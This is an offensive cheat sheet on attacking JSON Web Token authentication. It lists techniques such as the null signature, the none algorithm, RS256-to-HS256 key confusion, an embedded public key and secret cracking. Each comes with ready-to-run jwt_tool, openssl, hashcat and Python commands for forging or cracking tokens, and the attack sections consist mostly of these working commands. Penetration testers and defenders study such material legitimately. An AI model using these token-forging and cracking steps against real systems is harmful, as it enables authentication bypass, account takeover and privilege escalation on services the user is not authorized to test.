# JWT Vulnerabilities (Json Web Tokens)
JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.

## JWT Format
JSON Web Token : `Base64(Header).Base64(Data).Base64(Signature)`

Example :

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY

Where we can split it into 3 components separated by a dot.
```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # header
eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # payload
UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature
```
## JWT Signature - Null Signature Attack (CVE-2020-28042)
Send a JWT with HS256 algorithm without a signature like eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.

### Exploit:
```bash
python3 jwt_tool.py JWT_HERE -X n
```
### Deconstructed:
```bash
{"alg":"HS256","typ":"JWT"}.
{"sub":"1234567890","name":"John Doe","iat":1516239022}
```
## JWT Signature - Disclosure of a correct signature (CVE-2019-7644)
Send a JWT with an incorrect signature, the endpoint might respond with an error disclosing the correct one.
* [jwt-dotnet/jwt: Critical Security Fix Required: You disclose the correct signature with each SignatureVerificationException... #61](https://github.com/jwt-dotnet/jwt/issues/61)
* [CVE-2019-7644: Security Vulnerability in Auth0-WCF-Service-JWT](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)
```bash
Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
```



## jwt_tool
Run [jwt_tool](https://github.com/ticarpi/jwt_tool) with mode All Tests! and wait for green lines
```bash
python3 jwt_tool.py -M at \
    -t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
    -rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
If you are lucky the tool will find some case where the web application is incorrectly checking the JWT:
![jwt-1](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/e1d0c65a-0d30-4d1d-ad7c-45ca0911d322)

Then, you can search the request in your proxy or dump the used JWT for that request using jwt_ tool:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
## JWT Signature - None Algorithm (CVE-2015-9235)
Set the algorithm used as `"None"` and remove the signature part.

None algorithm variants:

* none
* None
* NONE
* nOnE

Alternatively you can modify an existing JWT (be careful with the expiration time)

**Using jwt_tool:**
```bash
python3 jwt_tool.py [JWT_HERE] -X a
```
**Manually editing the JWT:**
```python
import jwt

jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
decodedToken = jwt.decode(jwtToken, verify=False)  					

# decode the token before encoding with type 'None'
noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)

print(noneEncoded.decode())
```

## Change the algorithm RS256(asymmetric) to HS256(symmetric) (CVE-2016-5431/CVE-2016-10555)
The algorithm HS256 uses the secret key to sign and verify each message.
The algorithm RS256 uses the private key to sign the message and uses the public key for authentication.
If you change the algorithm from RS256 to HS256, the back end code uses the public key as the secret key and then uses the HS256 algorithm to verify the signature.
Then, using the public key and changing RS256 to HS256 we could create a valid signature. You can retrieve the certificate of the web server executing this:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
## New public key inside the header (CVE-2018-0114)
An attacker embeds a new key in the header of the token and the server uses this new key to verify the signature.
This can be done with the "JSON Web Tokens" Burp extension:
* Send the request to the Repeater, inside the JSON Web Token tab select "CVE-2018-0114" and send the request.

**Using jwt_tool**
```bash
python3 jwt_tool.py [JWT_HERE] -X i
```
**Using portswigger/JWT Editor**
1. Add a `New RSA key`
2. In the JWT's Repeater tab, edit data
3. `Attack` > `Embedded JWK`

## Break JWT secret
Useful list of 3502 public-available JWT: [wallarm/jwt-secrets/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list), including `your_jwt_secret`, `change_this_super_secret_random_string`, etc.

### JWT Bruteforce
bruteforce the "secret" key used to compute the signature using jwt_tool
```bash
python3 -m pip install termcolor cprint pycryptodomex requests
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C
```
### Hashcat
> Support added to crack JWT with hashcat at 365MH/s on a single GTX1080
* Dictionary attack: `hashcat -a 0 -m 16500 jwt.txt wordlist.txt`
* Rule-based attack: `hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule`
* Brute force attack: `hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6`



















